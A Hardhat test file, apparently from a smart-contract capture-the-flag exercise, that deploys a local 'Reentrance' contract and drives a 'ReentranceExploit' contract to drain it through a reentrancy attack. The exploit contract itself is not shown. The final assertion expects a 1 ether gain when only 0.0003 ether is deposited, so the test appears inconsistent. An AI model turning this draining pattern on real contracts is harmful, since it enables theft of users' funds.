import { expect } from "chai";
import { ethers } from "hardhat"

describe("Reentrance", function(){
	it("Should drain contract", async function(){
		// setup
		const [ deployer, s1 ] = await ethers.getSigners();

		const vulnerableContract = await (
			await ethers.getContractFactory("Reentrance")
		).deploy();
		await vulnerableContract.deployed();
		console.log("Reentrance address" + vulnerableContract.address);

		await deployer.sendTransaction({
			to: vulnerableContract.address,
			value: ethers.utils.parseEther("0.0002"),
		})

		// hack
		const contract = await (
			await ethers.getContractFactory("ReentranceExploit")
		).connect(s1).deploy();
		await contract.deployed();

		const donation = ethers.utils.parseEther("0.0001");
		await contract.connect(s1).makeDonation(
			vulnerableContract.address,
			{ value: donation }
		);

		await expect (
			contract.connect(s1).requestWithdraw(
				vulnerableContract.address,
				donation
			)
		).to.not.reverted;

		console.log("vul balance: " + await vulnerableContract.getBalance());
		console.log("exp balance: " + await contract.getBalance());

		// check
		await expect(
			() => contract.connect(s1).withdraw()
		).changeEtherBalance(s1, ethers.utils.parseEther("1"))

	})
})